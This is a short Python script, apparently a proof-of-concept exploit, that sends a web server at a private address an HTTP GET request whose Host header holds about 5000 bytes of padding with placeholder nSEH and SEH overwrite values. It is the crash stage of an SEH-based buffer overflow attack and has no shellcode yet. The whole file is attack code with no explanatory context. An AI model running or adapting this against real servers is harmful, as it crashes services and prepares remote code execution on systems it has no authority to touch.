import socket
import sys

host = "192.168.100.118"
port = 80

nseh = "BBBB"
seh = "CCCC"

crash  = "A" * 1549
crash += nseh
crash += seh
crash += "D" * (5000 - len(crash))

req = "GET / HTTP/1.1\r\n"
req += "Host: /.:/" + crash + "\r\n"
req += "User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0\r\n"
req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
req += "Accept-Language: en-US,en;q=0.5\r\n"
req += "Accept-Encoding: gzip, deflate\r\n"
req += "DNT: 1\r\n"
req += "Connection: keep-alive\r\n"
req += "Upgrade-Insecure-Requests: 1\r\n"
req += "Cache-Control: max-age=0\r\n\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.send(req)
s.close()


